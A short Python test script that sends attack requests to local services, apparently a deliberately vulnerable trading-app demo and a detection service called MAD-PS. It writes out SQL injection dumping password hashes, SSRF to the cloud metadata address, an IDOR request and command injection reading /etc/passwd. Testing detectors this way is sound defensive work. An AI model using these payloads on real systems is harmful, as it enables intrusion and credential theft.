import httpx

def test_flow():
    print("1. Testing Zerodha App APIs...")
    # SQLi
    r1 = httpx.post("http://127.0.0.1:5000/api/v1/market/search", content="' UNION SELECT username, password_hash FROM kite_users --")
    print("Zerodha SQLi status:", r1.status_code, r1.json())

    # SSRF
    r2 = httpx.post("http://127.0.0.1:5000/api/v1/webhooks/trigger", json={"webhook_url": "http://169.254.169.254/latest/meta-data/"})
    print("Zerodha SSRF status:", r2.status_code, r2.json())

    # IDOR / BOLA
    r3 = httpx.get("http://127.0.0.1:5000/api/v1/portfolio/holdings?user_id=1042", headers={"X-User-Id": "8892"})
    print("Zerodha BOLA status:", r3.status_code, r3.json())

    # Command Injection
    r4 = httpx.post("http://127.0.0.1:5000/api/v1/system/report", content="format=pdf; cat /etc/passwd; id")
    print("Zerodha RCE status:", r4.status_code, r4.json())

    # 2. Testing MAD-PS Attack Console / Inspect API
    print("\n2. Testing MAD-PS Ingestion & Detection Mesh...")
    r5 = httpx.post("http://127.0.0.1:8000/api/v1/inspect/payload", json={
        "payload": "' UNION SELECT username, password_hash FROM kite_users --",
        "method": "POST",
        "endpoint": "/api/v1/market/search",
        "source_ip": "192.168.1.100"
    }, timeout=10.0)
    print("MAD-PS Live Inspection result:", r5.status_code, r5.json())

if __name__ == "__main__":
    test_flow()
